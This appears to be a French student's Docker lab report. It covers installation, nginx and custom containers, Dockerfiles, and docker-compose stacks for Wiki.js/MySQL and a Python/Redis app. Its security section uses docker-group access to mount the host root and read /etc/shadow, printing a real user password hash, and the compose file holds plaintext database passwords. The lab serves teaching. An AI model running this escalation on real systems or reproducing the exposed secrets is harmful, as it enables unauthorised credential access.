
# tp1-docker

## Part I : Docker basics

🌞 Installer Docker votre machine Azure

Retirer les installations anciennes au cas où il y en aurait :
```
sudo apt-get remove docker docker-engine docker.io containerd runc
```

Installation de Docker
```
sudo apt-get update
sudo apt-get install apt-transport-https ca-certificates curl gnupg lsb-release
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
sudo apt-get install docker-ce docker-ce-cli containerd.io
```

verification de l'installation 
```
sudo docker run hello-world
Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/

```

Démarrage de Docker
```
sudo systemctl start docker
```

Ajout de l'utilisateur necrosus au groupe docker
```
sudo usermod -aG docker necrosus
```

Lancement de conteneurs
```
docker run -p 80:80 -d nginx
docker run -p 9999:80 -d nginx
curl http://13.73.48.134:9999/
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>

```
🌞 Custom un peu le lancement du conteneur
```
curl http://13.73.48.134:7777
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>TP docker </title>
</head>
<body>
    <h1>Hello world !!!</h1>
</body>
</html>
```

## Part II : Images

Construisez votre propre Dockerfile

🌞 Construire votre propre image

```
FROM debian:latest

RUN apt update -y && apt upgrade -y
RUN apt install -y apache2

COPY apache2.conf /etc/apache2/apache2.conf
COPY index.html /var/www/html/index.html

EXPOSE 80
CMD ["apache2", "-DFOREGROUND"]
```

## Part III : docker-compose
```
CMD ["apache2", "-DFOREGROUND"]

part3.md 
WikiJS
version: "3.8"

services:
  db:
    image: mysql:5.7
    restart: always
    ports:
      - "3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: myrootpassword
      MYSQL_DATABASE: wikijs
      MYSQL_USER: wikijs
      MYSQL_PASSWORD: wikijs123
    volumes:
      - "./db/mysql_files:/var/lib/mysql"
    healthcheck:
      test: ["CMD-SHELL", "mysqladmin ping -h localhost"]
      interval: 10s
      timeout: 5s
      retries: 5

  wiki:
    image: requarks/wiki:2
    restart: unless-stopped
    ports:
      - "3000:3000"

```

```
curl http://13.73.48.134:3000
<!DOCTYPE html><html><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta charset="UTF-8"><meta name="viewport" content="user-scalable=yes, width=device-width, initial-scale=1, maximum-scale=5"><meta name="theme-color" content="#1976d2"><meta name="msapplication-TileColor" content="#1976d2"><meta name="msapplication-TileImage" content="/_assets/favicons/mstile-150x150.png"><title>Wiki.js Setup</title><link rel="apple-touch-icon" sizes="180x180" href="/_assets/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="192x192" href="/_assets/favicons/android-chrome-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/_assets/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/_assets/favicons/favicon-16x16.png"><link rel="mask-icon" href="/_assets/favicons/safari-pinned-tab.svg" color="#1976d2"><link rel="manifest" href="/_assets/manifest.json"><script>var siteConfig = {"title":"Wiki.js"}
</script><link type="text/css" rel="stylesheet" href="/_assets/css/setup.22871ffac1b643eed4d9.css"><script type="text/javascript" src="/_assets/js/runtime.js?1738531300"></script><script type="text/javascript" src="/_assets/js/setup.js?1738531300"></script></head><body><div id="root"><setup wiki-version="2.5.306"></setup></div></body></html>
3
```

## Make your own meow
Dockerfile
```
WORKDIR /app


COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt


COPY . .

EXPOSE 8888


CMD ["python", "app.py"]


```

docker-compose.yml
```
version: "3.8"

services:
  app:
    build: .
    ports:
      - "8888:8888"
    environment:
      REDIS_HOST: redis
    depends_on:
      - redis
    restart: unless-stopped

  redis:
    image: redis:latest
    ports:
      - "6379:6379"
    restart: always

```

```
curl http://13.73.48.134:8888
<h1>Add key</h1>
<form action="/add" method = "POST">

Key:
<input type="text" name="key" >

Value:
<input type="text" name="value" >

<input type="submit" value="Submit">
</form>

<h1>Check key</h1>
<form action="/get" method = "POST">

Key:
<input type="text" name="key" >
<input type="submit" value="Submit">
</form>
```

## Part IV : Docker security

🌞 Prouvez que vous pouvez devenir root

```
docker run --rm -v /:/mnt alpine chroot /mnt cat /etc/shadow

Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
f18232174bc9: Pull complete
Digest: sha256:a8560b36e8b8210634f77d9f7f9efd7ffa463e380b75e2e74aff4511df3ef88c
Status: Downloaded newer image for alpine:latest
root:*:20140:0:99999:7:::
daemon:*:20140:0:99999:7:::
bin:*:20140:0:99999:7:::
sys:*:20140:0:99999:7:::
sync:*:20140:0:99999:7:::
games:*:20140:0:99999:7:::
man:*:20140:0:99999:7:::
lp:*:20140:0:99999:7:::
mail:*:20140:0:99999:7:::
news:*:20140:0:99999:7:::
uucp:*:20140:0:99999:7:::
proxy:*:20140:0:99999:7:::
www-data:*:20140:0:99999:7:::
backup:*:20140:0:99999:7:::
list:*:20140:0:99999:7:::
irc:*:20140:0:99999:7:::
_apt:*:20140:0:99999:7:::
nobody:*:20140:0:99999:7:::
systemd-network:!*:20140::::::
systemd-timesync:!*:20140::::::
dhcpcd:!:20140::::::
messagebus:!:20140::::::
syslog:!:20140::::::
systemd-resolve:!*:20140::::::
uuidd:!:20140::::::
tss:!:20140::::::
sshd:!:20140::::::
pollinate:!:20140::::::
tcpdump:!:20140::::::
landscape:!:20140::::::
fwupd-refresh:!*:20140::::::
polkitd:!*:20140::::::
_chrony:!:20140::::::
necrosus:$6$0yBErMmZ2GNTd6a9$1AFg1alzb66AY/3ck2BogA1VAMJnG01fOUKCiorYE5gacazaJ728AUdCbIGQPfERtjf0DxCcVOF2Y/8zK7oPN0:20161:0:99999:7:::

```

🌞 Utiliser Trivy
```
sudo trivy image ghcr.io/requarks/wiki:2
sudo trivy image mysql:5.7
sudo trivy image dockerfile
sudo trivy image nginx:latest
```


